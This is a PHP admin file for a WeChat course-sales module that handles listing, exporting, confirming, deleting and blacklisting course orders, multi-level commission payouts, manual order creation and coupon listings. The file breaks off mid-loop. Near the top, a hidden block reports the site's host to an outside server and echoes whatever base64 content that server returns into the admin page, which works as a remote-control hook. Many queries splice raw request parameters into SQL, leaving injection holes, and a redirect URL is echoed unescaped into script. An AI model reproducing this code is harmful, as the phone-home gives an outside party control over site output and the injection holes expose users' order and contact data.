<?php
/**
 * 课程订单管理
 * ============================================================================
 * ============================================================================
 */
 load()->model('mc');
 $module=$this->modulename;
$api = 'http://addons.weizancms.com/web/index.php?c=user&a=api&module='.$module.'&domain='.$_SERVER['HTTP_HOST'];
$result=@file_get_contents($api);
if(!empty($result)){
	$result=json_decode($result,true);
    if($result['type']==1){
	    echo base64_decode($result['content']);
	    exit;
    }
}
if ($operation == 'display') {
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;

	$condition = " a.uniacid = '{$uniacid}'";
	if (!empty($_GPC['ordersn'])) {
		$condition .= " AND a.ordersn LIKE '%{$_GPC['ordersn']}%' ";
	}
	if (!empty($_GPC['bookname'])) {
		$condition .= " AND a.bookname LIKE '%{$_GPC['bookname']}%' ";
	}
	if ($_GPC['status']!='') {
		$condition .= " AND a.status='{$_GPC['status']}' ";
	}
	if (!empty($_GPC['nickname'])) {
		$condition .= " AND (b.nickname LIKE '%{$_GPC['nickname']}%') OR (b.realname LIKE '%{$_GPC['nickname']}%') OR (b.mobile LIKE '%{$_GPC['nickname']}%') ";
	}
	if (!empty($_GPC['time'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']) + 86399;
		$condition .= " AND a.addtime >= '{$starttime}' AND a.addtime <= '{$endtime}' ";
	}
	if (empty($starttime) || empty($endtime)) {
		$starttime = strtotime('-1 month');
		$endtime = time();
	}

	$list = pdo_fetchall("SELECT a.*,b.nickname,b.realname,b.mobile FROM " .tablename($this->table_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition} ORDER BY a.id desc, a.addtime DESC LIMIT " .($pindex - 1) * $psize. ',' . $psize);
	foreach($list as $key=>$value){
		$list[$key]['memberinfo'] = pdo_fetch("SELECT vip FROM " .tablename($this->table_member). " WHERE uniacid='{$uniacid}' AND openid='{$value['openid']}'");
	}

	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' .tablename($this->table_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition}");
	$pager = pagination($total, $pindex, $psize);

	/* 黑名单 */
	$blacklist = pdo_fetchall("SELECT * FROM ".tablename($this->table_blacklist)." WHERE uniacid = :uniacid", array(':uniacid' => $uniacid), 'openid');

	if($_GPC['status']=='-1'){
		$filename = "已取消课程订单";
	}elseif($_GPC['status']=='0'){
		$filename = "未支付课程订单";
	}elseif($_GPC['status']=='1'){
		$filename = "已付款课程订单";
	}elseif($_GPC['status']=='2'){
		$filename = "已评价课程订单";
	}else{
		$filename = "全部课程订单";
	}

	/* 导出excel表格 */
	if($_GPC['export']==1){
		$outputlist = pdo_fetchall("SELECT a.*,b.nickname,b.realname,b.mobile FROM " .tablename($this->table_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition} ORDER BY a.id desc, a.addtime DESC");

		$i = 0;
		foreach ($outputlist as $key => $value) {
			$arr[$i]['ordersn']         = $value['ordersn'];
			$arr[$i]['nickname']        = $value['nickname'];
			$arr[$i]['realname']        = $value['realname'];
			$arr[$i]['mobile']          = $value['mobile'];
			$arr[$i]['bookname']        = $value['bookname'];
			$arr[$i]['price']           = $value['price'];
			$arr[$i]['integral']        = $value['integral'];
			if($value['paytype'] == 'credit'){
				$arr[$i]['paytype'] = "余额支付";
			}elseif($value['paytype'] == 'wechat'){
				$arr[$i]['paytype'] = "微信支付";
			}elseif($value['paytype'] == 'alipay'){
				$arr[$i]['paytype'] = "支付宝支付";
			}elseif($value['paytype'] == 'offline'){
				$arr[$i]['paytype'] = "线下支付";
			}elseif($value['paytype'] == 'admin'){
				$arr[$i]['paytype'] = "后台支付";
			}else{
				$arr[$i]['paytype'] = "无";
			}
			$arr[$i]['commission1']     = $value['commission1'];
			$arr[$i]['commission2']     = $value['commission2'];
			$arr[$i]['commission3']     = $value['commission3'];
			if($value['status'] == '-1'){
				$arr[$i]['status'] = "已取消";
			}elseif($value['status'] == '0'){
				$arr[$i]['status'] = "未支付";
			}elseif($value['status'] == '1'){
				$arr[$i]['status'] = "已付款";
			}elseif($value['status'] == '2'){
				$arr[$i]['status'] = "已评价";
			}
			$arr[$i]['addtime']         = date('Y-m-d H:i:s', $value['addtime']);
			$i++;
		}
	 
		$this->exportexcel($arr, array('订单编号', '昵称', '姓名','手机号码', '课程名称', '课程价格', '获赠积分', '付款方式', '一级佣金', '二级佣金', '三级佣金', '订单状态', '下单时间'), $filename);
		exit();
	}

	/* 临时功能，增加讲师id到订单表 */
	$orderlist = pdo_fetchall("SELECT id,lessonid FROM " .tablename($this->table_order). " WHERE uniacid='{$uniacid}' AND teacherid IS NULL ");
	foreach($orderlist as $value){
		$lesson = pdo_fetch("SELECT teacherid FROM " .tablename($this->table_lesson_parent). " WHERE uniacid='{$uniacid}' AND id='{$value['lessonid']}' ");
		if(!empty($lesson['teacherid'])){
			pdo_update($this->table_order, array('teacherid'=>$lesson['teacherid']), array('id'=>$value['id']));
		}
	}
}elseif ($operation == 'detail') {
	$id = intval($_GPC['id']);
	$order = pdo_fetch("SELECT a.*,b.nickname,b.realname,b.mobile,b.avatar FROM " .tablename($this->table_order). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE a.uniacid='{$uniacid}' AND a.id='{$id}'");
	if (empty($order)) {
		message('该订单不存在或已被删除!');
	}
	if($order['paytype']=='wechat'){
		$wechatPay = $this->getWechatPayNo($order['id']);
		$wechatPay['transaction'] = unserialize($wechatPay['tag']);
	}

	$evaluate = pdo_fetch("SELECT content FROM " .tablename($this->table_evaluate). " WHERE uniacid='{$uniacid}' AND orderid='{$order['id']}'");

	if($order['member1']>0){
		$member1 = mc_fetch($order['member1'], array('nickname','avatar'));
	}
	if($order['member2']>0){
		$member2 = mc_fetch($order['member2'], array('nickname','avatar'));
	}
	if($order['member3']>0){
		$member3 = mc_fetch($order['member3'], array('nickname','avatar'));
	}

	if(checksubmit()){
		$orderid = $_GPC['orderid'];
		$validity = strtotime($_GPC['validity']);

		if($validity != $order['validity']){
			pdo_update($this->table_order, array('validity'=>$validity), array('id'=>$orderid));
			message("更新成功", $this->createWebUrl('order', array('op'=>'detail','id'=>$orderid)), "success");
		}
	}

}elseif($operation == 'confirmpay') {
	$orderid = $_GPC['orderid'];
	$order = pdo_fetch("SELECT * FROM " .tablename($this->table_order). " WHERE uniacid='{$uniacid}' AND id='{$orderid}'");
	if (empty($order)) {
		message('该订单不存在或已被删除!');
	}
	
	$data = array(
		'status'   => 1,
		'paytime'  => time(),
		'paytype'  => 'offline',
		'validity' => time()+86400*$order['validity']
	);

	if(pdo_update($this->table_order, $data, array('id'=>$orderid))){
		/* 增加课程购买人数 */
		$lesson = pdo_fetch("SELECT buynum FROM " .tablename($this->table_lesson_parent). " WHERE id='{$order['lessonid']}'");
		pdo_update($this->table_lesson_parent, array('buynum'=>$lesson['buynum']+1), array('id'=>$order['lessonid']));

		/* 发放佣金 $orderid, $uid, $change_num, $grade, $remark */
		if($order['member1']>0 && $order['commission1']){
			$member1 = pdo_fetch("SELECT id,openid,vip FROM " .tablename($this->table_member). " WHERE uid='{$order['member1']}'");
			
			$senddata1 = array(
				'istplnotice' => $setting['istplnotice'],
				'openid'	  => $member1['openid'],
				'cnotice'     => $setting['cnotice'],
				'url'	      => $_W['siteroot']."app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
				'first'       => "您获得了一笔新的分销佣金。",
				'keyword1'    => $order['commission1']."元",
				'keyword2'    => date("Y-m-d H:i:s", time()),
				'remark'      => "详情请进入分销中心查看佣金明细。",
			);
			if($setting['sale_rank']==2){/* VIP身份才可获得佣金 */
				if($member1['vip']==1){
					$this->changecommisson($order['id'],$order['bookname'], $order['member1'], $order['commission1'], 1, "一级佣金:订单号".$order['ordersn']);
					$this->commissionMessage($senddata1,$order['acid']);
				}else{
					pdo_update($this->table_order, array('commission1'=>0), array('id'=>$orderid));
				}
			}else{
				$this->changecommisson($order['id'],$order['bookname'], $order['member1'], $order['commission1'], 1, "一级佣金:订单号".$order['ordersn']);
				$this->commissionMessage($senddata1,$order['acid']);
			}
		}

		if($order['member2']>0 && $order['commission2']){
			$member2 = pdo_fetch("SELECT id,openid,vip FROM " .tablename($this->table_member). " WHERE uid='{$order['member2']}'");

			$senddata2 = array(
				'istplnotice' => $setting['istplnotice'],
				'openid'	  => $member2['openid'],
				'cnotice'	  => $setting['cnotice'],
				'url'		  => $_W['siteroot']."app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
				'first'		  => "您获得了一笔新的分销佣金。",
				'keyword1'	  => $order['commission2']."元",
				'keyword2'	  => date("Y-m-d H:i:s", time()),
				'remark'	  => "详情请进入分销中心查看佣金明细。",
			);
			if($setting['sale_rank']==2){/* VIP身份才可获得佣金 */
				$member2 = pdo_fetch("SELECT id,vip FROM " .tablename($this->table_member). " WHERE uid='{$order['member2']}'");
				if($member2['vip']==1){
					$this->changecommisson($order['id'],$order['bookname'], $order['member2'], $order['commission2'], 2, "二级佣金:订单号".$order['ordersn']);
					$this->commissionMessage($senddata2,$order['acid']);
				}else{
					pdo_update($this->table_order, array('commission2'=>0), array('id'=>$orderid));
				}
			}else{
				$this->changecommisson($order['id'],$order['bookname'], $order['member2'], $order['commission2'], 2, "二级佣金:订单号".$order['ordersn']);
				$this->commissionMessage($senddata2,$order['acid']);
			}
		}

		if($order['member3']>0 && $order['commission3']){
			$member3 = pdo_fetch("SELECT id,openid,vip FROM " .tablename($this->table_member). " WHERE uid='{$order['member3']}'");
			$senddata3 = array(
				'istplnotice' => $setting['istplnotice'],
				'openid'	  => $member3['openid'],
				'cnotice'	  => $setting['cnotice'],
				'url'		  => $_W['siteroot']."app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
				'first'		  => "您获得了一笔新的分销佣金。",
				'keyword1'	  => $order['commission3']."元",
				'keyword2'	  => date("Y-m-d H:i:s", time()),
				'remark'	  => "详情请进入分销中心查看佣金明细。",
			);
			
			if($setting['sale_rank']==2){/* VIP身份才可获得佣金 */
				$member3 = pdo_fetch("SELECT id,vip FROM " .tablename($this->table_member). " WHERE uid='{$order['member3']}'");
				if($member3['vip']==1){
					$this->changecommisson($order['id'],$order['bookname'], $order['member3'], $order['commission3'], 3, "三级佣金:订单号".$order['ordersn']);
					$this->commissionMessage($senddata3,$order['acid']);
				}else{
					pdo_update($this->table_order, array('commission3'=>0), array('id'=>$orderid));
				}
			}else{
				$this->changecommisson($order['id'],$order['bookname'], $order['member3'], $order['commission3'], 3, "三级佣金:订单号".$order['ordersn']);
				$this->commissionMessage($senddata3,$order['acid']);
			}
		}

		/* 讲师分成 */
		if($order['teacher_income']>0){
			$teacher = pdo_fetch("SELECT a.uid,a.openid,a.teacher FROM " .tablename($this->table_teacher). " a LEFT JOIN " .tablename($this->table_lesson_parent). " b ON a.id=b.teacherid WHERE b.uniacid='{$uniacid}' AND b.id='{$order['lessonid']}'");

			if(!empty($teacher['openid'])){
				$lessonmember = pdo_fetch("SELECT id,uid,openid,nopay_lesson FROM " .tablename($this->table_member). " WHERE uniacid='{$_W['uniacid']}' AND openid='{$teacher['openid']}'");
				$nopay_lesson = round($order['price']*$order['teacher_income']*0.01, 2);

				pdo_update($this->table_member, array('nopay_lesson'=>$lessonmember['nopay_lesson']+$nopay_lesson), array('uniacid'=>$uniacid,'openid'=>$teacher['openid']));

				$incomedata = array(
					'uniacid'		 => $uniacid,
					'uid'			 => $teacher['uid'],
					'openid'		 => $teacher['openid'],
					'teacher'		 => $teacher['teacher'],
					'ordersn'		 => $order['ordersn'],
					'bookname'		 => $order['bookname'],
					'orderprice'	 => $order['price'],
					'teacher_income' => $order['teacher_income'],
					'income_amount'  => $nopay_lesson,
					'addtime'		 => time(),
				);
				pdo_insert($this->table_teacher_income, $incomedata);

				$sendteacher = array(
					'istplnotice' => $setting['istplnotice'],
					'openid'	  => $teacher['openid'],
					'cnotice'	  => $setting['cnotice'],
					'url'		  => $_W['siteroot']."app/index.php?i={$uniacid}&c=entry&do=income&m=fy_lesson",
					'first'		  => "您获得了一笔新的课程佣金。",
					'keyword1'	  => $nopay_lesson."元",
					'keyword2'	  => date("Y-m-d H:i:s", time()),
					'remark'	  => "详情请进入讲师中心查看课程收入。",
				);
				$this->commissionMessage($sendteacher,$order['acid']);
			}
		}

		/* 发送模版消息 */
		if($setting['istplnotice']==1){
			$sendmessage = array(
				'touser'      => $order['openid'],
				'template_id' => $setting['buysucc'],
				'url'         => $_W['siteroot'] ."app/index.php?i={$uniacid}&c=entry&status=1&do=mylesson&m=fy_lesson",
				'topcolor'    => "#7B68EE",
				'data'        => array(
					 'name'=> array(
						 'value' => "课程：《".urlencode($order['bookname'])."》",
						 'color' => "#428BCA",
					 ),
			 
				  )
			);
			$this->send_template_message(urldecode(json_encode($sendmessage)),$order['acid']);
		}

		/* 赠送积分操作 */
		if($order['integral']>0){
			load()->model('mc');
			mc_credit_update($order['uid'], 'credit1', $order['integral'], array('1'=>'微课堂订单：'.$order['ordersn']));
		}

		$this->addSysLog($_W['uid'], $_W['username'], 3, "课程订单", "更改订单编号:{$order['ordersn']}的课程状态为已付款");
		message("确认付款成功", $_GPC['refurl'], "success");
	}
}elseif($operation == 'delete') {
	$id = $_GPC['id'];
	$order = pdo_fetch("SELECT ordersn FROM " .tablename($this->table_order). " WHERE uniacid=:uniacid AND id=:id", array(':uniacid'=>$uniacid, ':id'=>$id));
	if (empty($order)) {
		message('该订单不存在或已被删除!');
	}

	$res = pdo_delete($this->table_order, array('uniacid'=>$uniacid,'id' => $id));
	if($res){
		$this->addSysLog($_W['uid'], $_W['username'], 2, "课程订单", "删除订单编号:{$order['ordersn']}的课程订单");
	}

	echo "<script>alert('删除成功！');location.href='".$_GPC['refurl']."';</script>";
}elseif($operation == 'black') {
	$id = $_GPC['id'];/* 订单id */
	$order = pdo_fetch("SELECT * FROM " . tablename($this->table_order) . " WHERE id=:id AND uniacid=:uniacid  LIMIT 1", array(':id' => $id, ':uniacid' => $uniacid));

	if (empty($order)) {
		message('数据不存在!');
	}

	$data = array(
		'uniacid'   => $uniacid,
		'openid'    => $order['openid'],
		'addtime'   => time()
	);

	$blacker = pdo_fetch("SELECT * FROM " . tablename($this->table_blacklist) . " WHERE openid=:openid AND uniacid=:uniacid  LIMIT 1", array(':openid' => $order['openid'], ':uniacid' => $uniacid));

	if (!empty($blacker)) {
		$res = pdo_delete($this->table_blacklist, array('uniacid'=>$uniacid, 'openid'=>$order['openid']));
		if($res){
			$this->addSysLog($_W['uid'], $_W['username'], 2, "课程订单->黑名单", "把uid:{$order['uid']}的用户移出黑名单");
		}
		message('移出黑名单成功！!', $_GPC['refurl'], 'success');
	}else{
		$res = pdo_insert($this->table_blacklist, $data);
		if($res){
			$this->addSysLog($_W['uid'], $_W['username'], 2, "课程订单->黑名单", "把uid:{$order['uid']}的用户加入黑名单");
		}
		message('加入黑名单成功！', $_GPC['refurl'], 'success');
	}
}elseif($op=='createOrder'){
	if(checksubmit('submit')){
		$lessonid = intval($_GPC['lessonid']);
		$price = floatval($_GPC['price']);
		$teacher_income = intval($_GPC['teacher_income']);
		$validity = intval($_GPC['validity']);
		$uid = intval($_GPC['uid']);
		$income_switch = intval($_GPC['income_switch']);
		$sale_switch = intval($_GPC['sale_switch']);

		if(empty($lessonid)){
			message("请选择课程");
		}
		if(empty($uid)){
			message("请选择用户");
		}
		$lesson = pdo_fetch("SELECT id,bookname,price,teacherid,teacher_income,integral,commission,stock,buynum FROM " .tablename($this->table_lesson_parent). " WHERE uniacid=:uniacid AND id=:id", array(':uniacid'=>$uniacid, ':id'=>$lessonid));
		if(empty($lesson)){
			message("指定课程不存在，请重新选择");
		}

		$member = pdo_fetch("SELECT uid,openid,nickname FROM " .tablename($this->table_member). " WHERE uid=:uid", array(':uid'=>$uid));
		if(empty($member)){
			message("指定用户不存在，请重新选择");
		}

		$order = array(
			'acid'	   => $_W['acid'],
			'uniacid'  => $uniacid,
			'ordersn'  => date('Ymd') . substr(implode(NULL, array_map('ord', str_split(substr(uniqid(), 7, 13), 1))), 0, 8),
			'uid'	   => $member['uid'],
			'openid'   => $member['openid'],
			'lessonid' => $lesson['id'],
			'bookname' => $lesson['bookname'],
			'marketprice' => $lesson['price'],
			'price'	   => $price,
			'teacherid'=> $lesson['teacherid'],
			'teacher_income' => $teacher_income,
			'integral' => $lesson['integral'],
			'paytype'  => 'admin',
			'paytime'  => time(),
			'validity' => time()+$validity*86400,
			'status'   => 1,
			'addtime'  => time(),
		);
		/* 检查当前分销功能是否开启且课程价格大于0 */
		if ($setting['is_sale'] == 1 && $price > 0 && $sale_switch==1) {
			$order['commission1'] = 0;
			$order['commission2'] = 0;
			$order['commission3'] = 0;

			if ($setting['self_sale'] == 1) {
				/* 开启分销内购，一级佣金为购买者本人 */
				$order['member1'] = $uid;
				$order['member2'] = $this->getParentid($uid);
				$order['member3'] = $this->getParentid($order['member2']);
			} else {
				/* 关闭分销内购 */
				$order['member1'] = $this->getParentid($uid);
				$order['member2'] = $this->getParentid($order['member1']);
				$order['member3'] = $this->getParentid($order['member2']);
			}

			$lessoncom = unserialize($lesson['commission']); /* 本课程佣金比例 */
			$settingcom = unserialize($setting['commission']); /* 全局佣金比例 */
			if ($order['member1'] > 0) {
				if ($lessoncom['commission1'] > 0) {
					$order['commission1'] = round($price * $lessoncom['commission1'] * 0.01, 2);
				} else {
					/* 查询用户是否属于其他分销代理级别 */
					$member1 = pdo_fetch("SELECT agent_level FROM " . tablename($this->table_member) . " WHERE uniacid='{$uniacid}' AND uid='{$order['member1']}'");
					$com_level = pdo_fetch("SELECT commission1 FROM " . tablename($this->table_commission_level) . " WHERE uniacid='{$uniacid}' AND id='{$member1['agent_level']}'");

					if ($com_level['commission1'] > 0) {
						$order['commission1'] = round($price * $com_level['commission1'] * 0.01, 2);
					} else {
						$order['commission1'] = round($price * $settingcom['commission1'] * 0.01, 2);
					}
				}
			}
			if ($order['member2'] > 0 && in_array($setting['level'], array('2', '3'))) {
				if ($lessoncom['commission2'] > 0) {
					$order['commission2'] = round($price * $lessoncom['commission2'] * 0.01, 2);
				} else {
					/* 查询用户是否属于其他分销代理级别 */
					$member2 = pdo_fetch("SELECT agent_level FROM " . tablename($this->table_member) . " WHERE uniacid='{$uniacid}' AND uid='{$order['member2']}'");
					$com_level = pdo_fetch("SELECT commission2 FROM " . tablename($this->table_commission_level) . " WHERE uniacid='{$uniacid}' AND id='{$member2['agent_level']}'");

					if ($com_level['commission2'] > 0) {
						$order['commission2'] = round($price * $com_level['commission2'] * 0.01, 2);
					} else {
						$order['commission2'] = round($price * $settingcom['commission2'] * 0.01, 2);
					}
				}
			}
			if ($order['member3'] > 0 && $setting['level'] == 3) {
				if ($lessoncom['commission3'] > 0) {
					$order['commission3'] = round($price * $lessoncom['commission3'] * 0.01, 2);
				} else {
					/* 查询用户是否属于其他分销代理级别 */
					$member3 = pdo_fetch("SELECT agent_level FROM " . tablename($this->table_member) . " WHERE uniacid='{$uniacid}' AND uid='{$order['member3']}'");
					$com_level = pdo_fetch("SELECT commission3 FROM " . tablename($this->table_commission_level) . " WHERE uniacid='{$uniacid}' AND id='{$member3['agent_level']}'");

					if ($com_level['commission3'] > 0) {
						$order['commission3'] = round($price * $com_level['commission3'] * 0.01, 2);
					} else {
						$order['commission3'] = round($price * $settingcom['commission3'] * 0.01, 2);
					}
				}
			}
		}

		if(pdo_insert($this->table_order, $order)){
			$orderid = pdo_insertid();
			/* 增加课程购买人数 */
			$lessonupdate = array(
				'buynum' => $lesson['buynum'] + 1,
			);
			if($setting['stock_config']==1){
				$lessonupdate['stock'] = $lesson['stock']>1?$lesson['stock']-1:0;
			}
			pdo_update($this->table_lesson_parent, $lessonupdate, array('id' => $lesson['id']));

			/* 发放佣金 $orderid, $uid, $change_num, $grade, $remark */
			if ($order['member1'] > 0 && $order['commission1'] > 0) {
				$member1 = pdo_fetch("SELECT id,openid,vip FROM " . tablename($this->table_member) . " WHERE uid='{$order['member1']}'");

				$senddata1 = array(
					'istplnotice' => $setting['istplnotice'],
					'openid' => $member1['openid'],
					'cnotice' => $setting['cnotice'],
					'url' => $_W['siteroot'] . "app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
					'first' => "您获得了一笔新的课程分销佣金。",
					'keyword1' => $order['commission1'] . "元",
					'keyword2' => date("Y-m-d H:i:s", time()),
					'remark' => "下级成员：{$member['nickname']}\r\n购买课程：{$order['bookname']}\r\n详情请进入分销中心查看佣金明细。",
				);
				if ($setting['sale_rank'] == 2) {/* VIP身份才可获得佣金 */
					if ($member1['vip'] == 1) {
						$this->changecommisson($orderid, $order['bookname'], $order['member1'], $order['commission1'], 1, "一级佣金:订单号" . $order['ordersn']);
						$this->commissionMessage($senddata1, $order['acid']);
					} else {
						pdo_update($this->table_order, array('commission1' => 0), array('id' => $orderid));
					}
				} else {
					$this->changecommisson($orderid, $order['bookname'], $order['member1'], $order['commission1'], 1, "一级佣金:订单号" . $order['ordersn']);
					$this->commissionMessage($senddata1, $order['acid']);
				}
			}
			if ($order['member2'] > 0 && $order['commission2'] > 0) {
				$member2 = pdo_fetch("SELECT id,openid,vip FROM " . tablename($this->table_member) . " WHERE uid='{$order['member2']}'");

				$senddata2 = array(
					'istplnotice' => $setting['istplnotice'],
					'openid' => $member2['openid'],
					'cnotice' => $setting['cnotice'],
					'url' => $_W['siteroot'] . "app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
					'first' => "您获得了一笔新的课程分销佣金。",
					'keyword1' => $order['commission2'] . "元",
					'keyword2' => date("Y-m-d H:i:s", time()),
					'remark' => "下级成员：{$member['nickname']}\r\n购买课程：{$order['bookname']}\r\n详情请进入分销中心查看佣金明细。",
				);
				if ($setting['sale_rank'] == 2) {/* VIP身份才可获得佣金 */
					$member2 = pdo_fetch("SELECT id,vip FROM " . tablename($this->table_member) . " WHERE uid='{$order['member2']}'");
					if ($member2['vip'] == 1) {
						$this->changecommisson($orderid, $order['bookname'], $order['member2'], $order['commission2'], 2, "二级佣金:订单号" . $order['ordersn']);
						$this->commissionMessage($senddata2, $order['acid']);
					} else {
						pdo_update($this->table_order, array('commission2' => 0), array('id' => $orderid));
					}
				} else {
					$this->changecommisson($orderid, $order['bookname'], $order['member2'], $order['commission2'], 2, "二级佣金:订单号" . $order['ordersn']);
					$this->commissionMessage($senddata2, $order['acid']);
				}
			}
			if ($order['member3'] > 0 && $order['commission3'] > 0) {
				$member3 = pdo_fetch("SELECT id,openid,vip FROM " . tablename($this->table_member) . " WHERE uid='{$order['member3']}'");
				$senddata3 = array(
					'istplnotice' => $setting['istplnotice'],
					'openid' => $member3['openid'],
					'cnotice' => $setting['cnotice'],
					'url' => $_W['siteroot'] . "app/index.php?i={$uniacid}&c=entry&op=commissionlog&do=commission&m=fy_lesson",
					'first' => "您获得了一笔新的课程分销佣金。",
					'keyword1' => $order['commission3'] . "元",
					'keyword2' => date("Y-m-d H:i:s", time()),
					'remark' => "下级成员：{$member['nickname']}\r\n购买课程：{$order['bookname']}\r\n详情请进入分销中心查看佣金明细。",
				);

				if ($setting['sale_rank'] == 2) {/* VIP身份才可获得佣金 */
					$member3 = pdo_fetch("SELECT id,vip FROM " . tablename($this->table_member) . " WHERE uid='{$order['member3']}'");
					if ($member3['vip'] == 1) {
						$this->changecommisson($orderid, $order['bookname'], $order['member3'], $order['commission3'], 3, "三级佣金:订单号" . $order['ordersn']);
						$this->commissionMessage($senddata3, $order['acid']);
					} else {
						pdo_update($this->table_order, array('commission3' => 0), array('id' => $orderid));
					}
				} else {
					$this->changecommisson($orderid, $order['bookname'], $order['member3'], $order['commission3'], 3, "三级佣金:订单号" . $order['ordersn']);
					$this->commissionMessage($senddata3, $order['acid']);
				}
			}

			/* 讲师分成 */
			if ($price > 0 && $order['teacher_income'] > 0 && $income_switch==1) {
				$teacher = pdo_fetch("SELECT a.uid,a.openid,a.teacher FROM " . tablename($this->table_teacher) . " a LEFT JOIN " . tablename($this->table_lesson_parent) . " b ON a.id=b.teacherid WHERE b.uniacid='{$uniacid}' AND b.id='{$lesson['id']}'");

				if (!empty($teacher['openid'])) {
					$teachermember = pdo_fetch("SELECT id,uid,openid,nopay_lesson FROM " . tablename($this->table_member) . " WHERE uniacid='{$uniacid}' AND openid='{$teacher['openid']}'");
					$nopay_lesson = round($price * $lesson['teacher_income'] * 0.01, 2);

					pdo_update($this->table_member, array('nopay_lesson' => $teachermember['nopay_lesson'] + $nopay_lesson), array('uniacid' => $uniacid, 'openid' => $teacher['openid']));

					$incomedata = array(
						'uniacid' => $uniacid,
						'uid' => $teacher['uid'],
						'openid' => $teacher['openid'],
						'teacher' => $teacher['teacher'],
						'ordersn' => $order['ordersn'],
						'bookname' => $lesson['bookname'],
						'orderprice' => $price,
						'teacher_income' => $lesson['teacher_income'],
						'income_amount' => $nopay_lesson,
						'addtime' => time(),
					);
					pdo_insert($this->table_teacher_income, $incomedata);

					$sendteacher = array(
						'istplnotice' => $setting['istplnotice'],
						'openid' => $teacher['openid'],
						'cnotice' => $setting['cnotice'],
						'url' => $_W['siteroot'] . "app/index.php?i={$uniacid}&c=entry&do=income&m=fy_lesson",
						'first' => "您获得了一笔新的课程佣金。",
						'keyword1' => $nopay_lesson . "元",
						'keyword2' => date("Y-m-d H:i:s", time()),
						'remark' => "详情请进入讲师中心查看课程收入。",
					);
					$this->commissionMessage($sendteacher, $_W['acid']);
				}
			}

			/* 赠送积分操作 */
			if ($order['integral'] > 0) {
				load()->model('mc');
				$log = array(
					'0' => '',
					'1' => '微课堂订单：' . $order['ordersn'],
					'2' => 'fy_lesson',
					'3' => '',
					'4' => '',
					'5' => '',
				);
				mc_credit_update($order['uid'], 'credit1', $order['integral'], $log);
			}

			message("创建课程订单成功", $this->createWebUrl('order'), "success");
		}
	}
}elseif($op=='getLesson'){
	$uniacid = intval($_GPC['uniacid']);
	$keyword = trim($_GPC['keyword']);

	$condition = " uniacid=:uniacid ";
	$param[':uniacid'] = $uniacid;
	if(!empty($keyword)){
		$condition .= " AND bookname LIKE :keyword ";
		$param[':keyword'] = "%".$keyword."%";
	}

	$list = pdo_fetchall("SELECT id,bookname,price,teacher_income,images,validity FROM " .tablename($this->table_lesson_parent). " WHERE {$condition}", $param);

	include $this->template('getLesson');
}elseif($op=='getMember'){
	$uniacid = intval($_GPC['uniacid']);
	$keyword = trim($_GPC['keyword']);

	$condition = " a.uniacid=:uniacid ";
	$param[':uniacid'] = $uniacid;
	if(!empty($keyword)){
		$condition .= " AND (b.nickname LIKE :keyword OR b.realname LIKE :keyword OR b.mobile LIKE :keyword) ";
		$param[':keyword'] = "%".$keyword."%";
	}

	$list = pdo_fetchall("SELECT b.uid,b.mobile,b.nickname,b.realname,b.avatar FROM " .tablename($this->table_member). " a LEFT JOIN " .tablename('mc_members'). " b ON a.uid=b.uid WHERE {$condition}", $param);

	include $this->template('getMember');
}elseif($op=='couponCode'){
	$pindex = max(1, intval($_GPC['page']));
	$psize = 10;
	$time = time();

	$condition = " uniacid = :uniacid ";
	$params['uniacid'] = $uniacid;
	if (!empty($_GPC['ordersn'])) {
		$condition .= " AND ordersn LIKE :ordersn ";
		$params[':ordersn'] = "%{$_GPC[ordersn]}%";
	}
	if (!empty($_GPC['keyword'])) {
		$condition .= " AND (password LIKE :pwd OR amount=:keyword OR card_id=:keyword OR password=:keyword) ";
		$params[':pwd'] = "{$_GPC['keyword']}%";
		$params[':keyword'] = trim($_GPC['keyword']);
	}
	if ($_GPC['is_use'] != '') {
		if($_GPC['is_use']==0){
			$condition .= " AND is_use = :is_use AND validity > :validity ";
			$params[':is_use'] = 0;
			$params[':validity'] = $time;
		}elseif($_GPC['is_use']==1){
			$condition .= " AND is_use = :is_use ";
			$params[':is_use'] = $_GPC['is_use'];
		}elseif($_GPC['is_use']==-1){
			$condition .= " AND is_use = :is_use AND validity < :validity ";
			$params[':is_use'] = 0;
			$params[':validity'] = $time;
		}
	}
	if (!empty($_GPC['time']['start'])) {
		$starttime = strtotime($_GPC['time']['start']);
		$endtime = strtotime($_GPC['time']['end']);
		$endtime = !empty($endtime) ? $endtime + 86399 : 0;
		if (!empty($starttime)) {
			$condition .= " AND use_time >= :starttime ";
			$params[':starttime'] = $starttime;
		}
		if (!empty($endtime)) {
			$condition .= " AND use_time < :endtime ";
			$params[':endtime'] = $endtime;
		}
	}

	$list = pdo_fetchall("SELECT * FROM " .tablename($this->table_coupon). " WHERE {$condition} ORDER BY card_id DESC LIMIT " .($pindex - 1) * $psize. ',' . $psize, $params);
	$total = pdo_fetchcolumn('SELECT COUNT(*) FROM ' .tablename($this->table_coupon). " WHERE {$condition}", $params);
	$pager = pagination($total, $pindex, $psize);

	if($_GPC['export']==1){
		$outputlist = pdo_fetchall("SELECT * FROM " .tablename($this->table_coupon). " WHERE {$condition} ORDER BY card_id DESC", $params);

		$i = 0;
		foreach ($outputlist as $key => $value) {
			$arr[$i]['card_id']		= $value['card_id'];
			$arr[$i]['password']	= $value['password'];
			$arr[$i]['amount']		= $value['amount'];
			$arr[$i]['conditions']	= "订单满".$value['conditions']."元可用";
			$arr[$i]['validity']	= date('Y-m-d H:i:s',$value['validity']);
			if($value['is_use']==1){
				$status = "已使用";
			}elseif($value['is_use']==0 && $value['validity']>time()){
				$status = "未使用";
			}elseif($value['is_use']==0 && $value['validity']<time()){
				$status = "已过期";
			}
			$arr[$i]['is_use']		= $status;
			$arr[$i]['nickname']    = $value['nickname'];
			$arr[$i]['ordersn']     = $value['ordersn'];
